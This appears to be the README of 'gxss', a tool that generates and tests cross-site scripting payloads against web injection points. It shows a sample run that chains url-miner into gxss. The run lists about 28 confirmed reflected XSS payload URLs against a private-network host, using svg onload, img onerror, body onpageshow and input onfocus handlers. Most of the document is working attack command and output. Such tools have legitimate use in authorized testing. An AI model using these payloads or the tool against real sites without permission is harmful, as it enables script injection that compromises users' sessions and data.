# gxss
Generate and test XSS payloads given injection points

```
$ echo http://192.168.1.108:9999/home | ../url-miner/url-miner -w ../url-miner/testwords -json | ./gxss -s -debug-chrome
[confirmed] http://192.168.1.108:9999/home?q=<svg onload=alert`x`>
[confirmed] http://192.168.1.108:9999/home?q=<svg onload=alert()>
[confirmed] http://192.168.1.108:9999/home?q=<svg onload=alert()>
[confirmed] http://192.168.1.108:9999/home?q=<svg onload=javascript:alert()>
[confirmed] http://192.168.1.108:9999/home?q=<svg onload=javascript:alert``>
[confirmed] http://192.168.1.108:9999/home?q=<svg onload=alert(x)>
[confirmed] http://192.168.1.108:9999/home?q=<svg onload=alert(1)>
[confirmed] http://192.168.1.108:9999/home?q=<svg onload=prompt()>
[confirmed] http://192.168.1.108:9999/home?q=<svg onload=prompt``>
[confirmed] http://192.168.1.108:9999/home?q=<svg onload=alert``>
[confirmed] http://192.168.1.108:9999/home?q=<body onpageshow=alert()>
[confirmed] http://192.168.1.108:9999/home?q=<body onpageshow=alert(1)>
[confirmed] http://192.168.1.108:9999/home?q=<body onpageshow=prompt()>
[confirmed] http://192.168.1.108:9999/home?q=<body onpageshow=prompt``>
[confirmed] http://192.168.1.108:9999/home?q=<body onpageshow=alert``>
[confirmed] http://192.168.1.108:9999/home?q=<body onpageshow=alert`x`>
[confirmed] http://192.168.1.108:9999/home?q=<body onpageshow=javascript:alert()>
[confirmed] http://192.168.1.108:9999/home?q=<body onpageshow=javascript:alert``>
[confirmed] http://192.168.1.108:9999/home?q=<img onerror=alert() src=>
[confirmed] http://192.168.1.108:9999/home?q=<img onerror=alert(x) src=>
[confirmed] http://192.168.1.108:9999/home?q=<img onerror=alert(1) src=>
[confirmed] http://192.168.1.108:9999/home?q=<img onerror=prompt() src=>
[confirmed] http://192.168.1.108:9999/home?q=<img onerror=prompt`` src=>
[confirmed] http://192.168.1.108:9999/home?q=<img onerror=alert`` src=>
[confirmed] http://192.168.1.108:9999/home?q=<img onerror=alert`x` src=>
[confirmed] http://192.168.1.108:9999/home?q=<img onerror=javascript:alert() src=>
[confirmed] http://192.168.1.108:9999/home?q=<img onerror=javascript:alert`` src=>
[confirmed] http://192.168.1.108:9999/home?q=<input autofocus="" onfocus=alert()>
```
